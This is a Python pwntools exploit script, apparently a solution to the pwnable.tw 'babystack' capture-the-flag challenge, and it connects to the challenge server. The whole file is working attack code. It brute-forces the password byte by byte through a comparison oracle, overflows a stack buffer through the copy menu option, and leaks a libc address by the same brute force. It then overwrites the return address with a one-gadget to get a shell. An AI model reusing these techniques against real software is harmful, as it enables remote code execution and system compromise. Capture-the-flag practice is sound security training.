from pwn import *
from icecream import ic

exe = ELF("./babystack_patched")
libc = ELF("./libc_64.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True

    if args.REMOTE:
        return remote("chall.pwnable.tw", 10205)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
pie b 0xecf
c
'''.format(**locals())

def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()

r = start()

def brutepass():
    payload = b''
    for i in range(16):
        for j in range(1, 256):
            ru(">>")
            sl(b'1')
            
            payload += p8(j)
            ru("sowrd :")
            sl(payload)
            x = rl()
            if "Success" in x.decode():
                ru(">>")
                sl(b'1')
                break
            else:
                payload = payload[:-1]
    return payload
    
def brutepass2():
    # payload = b'a'*(16)
    # payload += b'1'
    # payload += b'a'*7
    payload = password
    leak = b''
    for i in range(6):
        for j in range(1, 256):
            ru(">>")
            s(b'1')
            
            payload += p8(j)
            ru("sowrd :")
            sl(payload)
            x = rl()
            if "Success" in x.decode():
                ru(">>")
                s(b'1')
                leak += p8(j)
                break
            else:
                payload = payload[:-1]
    return leak

password = brutepass()
ic(password)
# ru(">>")
# sl(b'1')
# ru("sowrd :")
# sl(password)

payload = password 
payload += b'\x00'*1
payload += b'a'*(63-16)
payload += password
# payload += b'a'*(48+16+7)
ru(">>")
s(b'1')
ru("sowrd :")
s(payload)

payload = b'a' * 63
ru(">>")
sl(b'3')
ru("Copy :")
s(payload)

ru(">>")
s(b'1')

leak = brutepass2()
libc_leak = u64(leak + b'\x00\x00')
ic(hex(libc_leak))
libc_base = libc_leak - 3950129
ic(hex(libc_base))
oneshot = libc_base + 0xf0567

payload = password
payload += leak
payload += b'\x00'
payload += b'a'*(104-23-40)
payload += password
payload += b'a' * 24
payload += p64(oneshot)
ru(">>")
s('1')
ru("sowrd :")
s(payload)

payload = b'a' * 63
ru(">>")
sl(b'3')
ru("Copy :")
s(payload)

ru(">>")
s(b'1')

# for j in range(8):
#     payload = b'\x00'
#     ru(">>")
#     s(b'1')
#     ru("sowrd :")
#     s(payload)

#     payload = b'a' * (43+4 - j) 
#     payload += b'\x00'*4
#     payload += b'a' * 5
#     ru(">>")
#     s(b'3')
#     ru("Copy :")
#     s(payload)

#     ru(">>")
#     s(b'1')

ru(">>")
s(b'1')
ru("sowrd :")
sl(b'')

ru(">>")
sl(b'2')

i()
